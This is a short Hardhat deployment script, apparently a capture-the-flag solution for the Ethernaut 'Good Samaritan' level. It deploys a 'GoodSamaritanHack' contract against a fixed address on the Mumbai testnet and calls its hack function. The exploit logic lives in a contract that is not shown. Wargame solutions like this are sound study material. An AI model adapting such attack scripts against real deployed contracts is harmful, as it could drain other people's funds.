const { ethers } = require("hardhat")
const { logTxResult } = require("../../utils/logTxResult")
const {
  abi: ABIIERC20,
} = require("../../artifacts/contracts/22/DEX.sol/IERC20.json")

require("dotenv").config()
const _provider = process.env.PROVIDER_MUMBAI
const privateKey = process.env.PRIVATE_KEY

const provider = new ethers.providers.JsonRpcProvider(_provider)
const signer = new ethers.Wallet(privateKey, provider)
const signerAddr = signer.address

/* DEPLOY + ATTACK */
async function main() {
  /* CONTRACT NAME */
  const contractToDeploy = "GoodSamaritanHack"
  const MyContract = await ethers.getContractFactory(contractToDeploy)
  /* @remind la private key va en hardhat.config.js */
  const GoodSamaritanHackContract = await MyContract.deploy(
    "0x5D3CF96cCc5f79B9e2B2c8822Ac4A104B4aF984b",
    {
      gasLimit: 1000000,
    }
  )
  console.log("GoodSamaritanHackContract", GoodSamaritanHackContract.address)

  const tx = await GoodSamaritanHackContract.connect(signer).hackGoodSamaritan({
    gasLimit: 10000000,
  })
  const res = await tx.wait()
  logTxResult(res)
}

main()
  .then(async (myContract) => {})
  .then(() => process.exit(0))
  .catch((error) => {
    console.error(error)
    process.exit(1)
  })

/* 
  npx hardhat run contracts/26/DeployAndCall__Attack.js --network mumbai
*/
